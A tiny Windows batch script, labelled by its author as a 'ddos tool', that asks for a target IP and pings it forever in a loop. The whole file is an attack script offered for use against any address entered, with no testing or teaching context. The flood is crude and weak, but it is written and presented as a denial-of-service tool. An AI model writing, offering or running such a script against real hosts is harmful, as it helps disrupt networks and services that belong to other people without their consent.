@echo off
title ddos tool made with batch by -taha185
set /p ip="Enter target ip: "
:a
ping -n 1 -w 1 %ip%
goto a
